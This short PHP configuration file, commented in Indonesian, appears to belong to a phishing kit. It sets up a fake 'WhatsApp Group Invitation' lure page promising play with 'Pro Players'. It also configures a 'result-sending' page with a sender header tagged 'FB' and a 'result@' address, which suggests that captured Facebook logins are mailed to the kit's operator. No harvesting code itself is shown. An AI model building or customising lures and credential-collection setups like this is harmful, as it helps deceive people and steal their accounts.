<?php
// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

// KONTROL UNTUK HALAMAN
$title = 'Undangan Grup Whatsapp';
$description = 'Bergabunglah Dan Ikut Bermain Bersama Pro Player';
$theme = '#128c7e';
$image = 'img/icon.png';
$icon = 'img/icon.png';

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'ITS ME ARPANTEK';
$sender = 'From: NADHEO EXCODE - FB <result@arpantek.com>';
?>